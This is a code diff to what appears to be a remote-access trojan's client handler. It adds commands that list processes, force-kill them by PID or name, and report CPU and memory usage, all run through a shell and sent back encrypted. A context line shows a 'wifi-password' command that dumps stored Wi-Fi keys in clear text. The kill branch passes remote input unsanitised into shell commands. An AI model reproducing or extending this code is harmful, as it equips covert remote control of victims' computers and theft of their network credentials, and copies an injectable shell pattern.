@@ -248,6 +248,103 @@ class ClientHandler:
                         result = subprocess.run("hostnamectl", shell=True, capture_output=True, text=True).stdout
                     self.send_data(result.encode())
                 
+                elif cmd == "ps":
+                    if os_name=="Windows":
+                        result = subprocess.run("tasklist /v", shell=True, capture_output=True, text=True).stdout
+                    else:
+                        result = subprocess.run("ps aux", shell=True, capture_output=True, text=True).stdout
+                    self.send_data(result.encode())
+                
+                elif cmd.startswith("kill "):
+                    try:
+                        target = cmd.split(" ", 1)[1]
+                        if os_name=="Windows":
+                            try:
+                                pid = int(target)
+                                result = subprocess.run(f"taskkill /F /PID {pid}", shell=True, capture_output=True, text=True)
+                            except ValueError:
+                                result = subprocess.run(f"taskkill /F /IM {target}", shell=True, capture_output=True, text=True)
+                        else:
+                            try:
+                                pid = int(target)
+                                result = subprocess.run(f"kill -9 {pid}", shell=True, capture_output=True, text=True)
+                            except ValueError:
+                                result = subprocess.run(f"pkill -9 {target}", shell=True, capture_output=True, text=True)
+                        
+                        if result.returncode == 0:
+                            self.send(encrypt(b"1"))
+                            self.send(encrypt(f"Successfully killed process: {target}".encode()))
+                        else:
+                            self.send(encrypt(b"1"))
+                            self.send(encrypt(f"Failed to kill process: {target}\nError: {result.stderr}".encode()))
+                    except Exception as e:
+                        self.send(encrypt(b"1"))
+                        self.send(encrypt(f"Error killing process: {str(e)}".encode()))
+                
+                elif cmd == "system":
+                    try:
+                        if os_name=="Windows":
+                            cpu_cmd = 'wmic cpu get loadpercentage'
+                            mem_cmd = 'wmic OS get FreePhysicalMemory,TotalVisibleMemorySize /Value'
+                            
+                            cpu_result = subprocess.run(cpu_cmd, shell=True, capture_output=True, text=True)
+                            mem_result = subprocess.run(mem_cmd, shell=True, capture_output=True, text=True)
+                            
+                            cpu_lines = cpu_result.stdout.strip().split('\n')
+                            mem_lines = mem_result.stdout.strip().split('\n')
+                            
+                            cpu_usage = cpu_lines[2].strip() if len(cpu_lines) > 1 else "0"
+                            if not cpu_usage.isdigit():
+                                cpu_usage = "0"
+                            
+                            total_mem = 0
+                            free_mem = 0
+                            for line in mem_lines:
+                                if "TotalVisibleMemorySize" in line:
+                                    total_mem = int(line.split('=')[1].strip())
+                                elif "FreePhysicalMemory" in line:
+                                    free_mem = int(line.split('=')[1].strip())
+                            
+                            used_mem = total_mem - free_mem
+                            mem_percent = (used_mem / total_mem * 100) if total_mem > 0 else 0
+                            
+                            output = "System Resource Usage:\n"
+                            output += f"CPU Usage: {cpu_usage}%\n"
+                            output += f"Memory Usage: {mem_percent:.1f}%\n"
+                            output += f"Total Memory: {total_mem/1024/1024:.1f} GB\n"
+                            output += f"Used Memory: {used_mem/1024/1024:.1f} GB\n"
+                            output += f"Free Memory: {free_mem/1024/1024:.1f} GB"
+                        else:
+                            cpu_cmd = "top -bn1 | grep 'Cpu(s)' | awk '{print $2}'"
+                            mem_cmd = "free -m | grep Mem"
+                            
+                            cpu_result = subprocess.run(cpu_cmd, shell=True, capture_output=True, text=True)
+                            mem_result = subprocess.run(mem_cmd, shell=True, capture_output=True, text=True)
+                            
+                            cpu_usage = cpu_result.stdout.strip() or "0"
+                            mem_values = mem_result.stdout.split()
+                            
+                            if len(mem_values) >= 7:
+                                total_mem = int(mem_values[1])
+                                used_mem = int(mem_values[2])
+                                free_mem = int(mem_values[3])
+                                mem_percent = (used_mem / total_mem * 100) if total_mem > 0 else 0
+                                
+                                output = "System Resource Usage:\n"
+                                output += f"CPU Usage: {cpu_usage}%\n"
+                                output += f"Memory Usage: {mem_percent:.1f}%\n"
+                                output += f"Total Memory: {total_mem/1024:.1f} GB\n"
+                                output += f"Used Memory: {used_mem/1024:.1f} GB\n"
+                                output += f"Free Memory: {free_mem/1024:.1f} GB"
+                            else:
+                                output = "Failed to get memory information"
+                        
+                        self.send(encrypt(b"1"))
+                        self.send(encrypt(output.encode()))
+                    except Exception as e:
+                        self.send(encrypt(b"1"))
+                        self.send(encrypt(f"Error getting system info: {str(e)}".encode()))
+                
                 elif cmd.startswith("wifi-password "):
                     wifi_network = cmd.split(" ",1)[1]
                     command = f'netsh wlan show profile "{wifi_network}" key=clear'
